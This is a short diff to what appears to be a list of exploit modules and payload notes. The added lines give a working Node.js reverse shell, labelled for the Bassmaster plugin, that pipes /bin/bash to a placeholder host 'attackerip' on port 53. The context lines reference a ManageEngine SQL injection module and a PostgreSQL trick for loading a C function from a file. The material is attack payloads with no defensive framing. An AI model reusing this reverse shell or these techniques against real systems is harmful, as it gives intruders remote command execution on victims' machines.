@@ -103,6 +103,12 @@ Module : ManageEngine Application Manager AMUserResourcesSyncServlet SQL(Postgre
 10. PostgreSQL Extensions<br>
         CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
         
-    
+Module : The Bassmaster Plugin (Nodejs) : 
+1. JavaScript reverse shell
+     var net = require("net"), sh = require("child_process").exec("/bin/bash");
+     var client = new net.Socket();
+     client.connect(53, "attackerip",
+     function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+     sh.stderr.pipe(client);});
 
     
